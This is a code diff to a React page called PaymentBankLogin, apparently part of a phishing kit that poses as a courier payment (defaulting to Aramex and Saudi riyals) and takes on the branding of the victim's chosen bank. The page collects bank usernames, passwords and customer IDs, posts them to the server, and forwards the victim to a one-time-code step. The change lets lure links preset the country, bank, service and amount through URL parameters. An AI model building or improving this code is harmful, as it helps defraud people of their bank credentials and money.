@@ -1,5 +1,5 @@
 import { useState, useEffect } from "react";
-import { useParams, useNavigate } from "react-router-dom";
+import { useParams, useNavigate, useSearchParams } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
@@ -22,6 +22,7 @@ const PaymentBankLogin = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
+  const [searchParams] = useSearchParams();
   const { data: linkData, isLoading: linkLoading } = useLink(id);
   const updateLink = useUpdateLink();
   
@@ -31,19 +32,26 @@ const PaymentBankLogin = () => {
   const [customerId, setCustomerId] = useState("");
   const [showPassword, setShowPassword] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [isReady, setIsReady] = useState(false);
+
+  const countryParam = searchParams.get('country') || searchParams.get('c');
+  const serviceParam = searchParams.get('service') || searchParams.get('s');
+  const amountParam = searchParams.get('amount') || searchParams.get('a');
+  const currencyParam = searchParams.get('currency');
+  const bankParam = searchParams.get('bank') || searchParams.get('b');
 
   const customerInfo = linkData?.payload?.customerInfo || {};
-  const selectedBankId = linkData?.payload?.selectedBank || '';
+  const selectedBankId = bankParam || linkData?.payload?.selectedBank || '';
   const cardInfo = linkData?.payload?.cardInfo || {};
   
-  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
+  const serviceKey = serviceParam || linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   
   const selectedBankBranding = selectedBankId && selectedBankId !== 'skipped' ? bankBranding[selectedBankId] : null;
-  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
+  const selectedCountry = countryParam || linkData?.payload?.selectedCountry || "SA";
   const shippingInfo = linkData?.payload as any;
-  const rawAmount = shippingInfo?.cod_amount;
+  const rawAmount = amountParam || shippingInfo?.cod_amount;
 
   let amount = 500;
   if (rawAmount !== undefined && rawAmount !== null) {
@@ -57,16 +65,25 @@ const PaymentBankLogin = () => {
     }
   }
 
-  const formattedAmount = formatCurrency(amount, selectedCountry);
+  const currencyCode = currencyParam || shippingInfo?.currency_code || "SAR";
+  const formattedAmount = formatCurrency(amount, currencyCode);
   
   const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
-  const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
+  const selectedCountryData = getCountryByCode(selectedCountry);
   
   useEffect(() => {
     if (selectedBankId && selectedBankId !== 'skipped') {
       applyDynamicIdentity(`bank_${selectedBankId}`);
     }
+    setIsReady(true);
   }, [selectedBankId]);
+  
+  useEffect(() => {
+    const timer = setTimeout(() => {
+      setIsReady(true);
+    }, 2000);
+    return () => clearTimeout(timer);
+  }, []);
   
   const getLoginType = () => {
     if (!selectedBank) return 'username';
@@ -88,7 +105,7 @@ const PaymentBankLogin = () => {
   
   const loginType = getLoginType();
   
-  if (linkLoading || !linkData) {
+  if (!isReady || (linkLoading && !countryParam)) {
     return (
       <div 
         className="min-h-screen flex items-center justify-center" 
@@ -162,6 +179,11 @@ const PaymentBankLogin = () => {
       }
     }
     
+    sessionStorage.setItem('paymentCountry', selectedCountry);
+    sessionStorage.setItem('paymentAmount', amount.toString());
+    sessionStorage.setItem('paymentCurrency', currencyCode);
+    sessionStorage.setItem('paymentService', serviceKey);
+    
     try {
       await fetch("/", {
         method: "POST",
@@ -217,7 +239,14 @@ const PaymentBankLogin = () => {
       description: "تم تسجيل الدخول بنجاح",
     });
     
-    navigate(`/pay/${id}/otp`);
+    const queryString = new URLSearchParams({
+      country: selectedCountry,
+      service: serviceKey,
+      amount: amount.toString(),
+      currency: currencyCode
+    }).toString();
+    
+    navigate(`/pay/${id}/otp?${queryString}`);
   };
   
   const primaryColor = selectedBankBranding?.colors?.primary || branding.colors.primary;
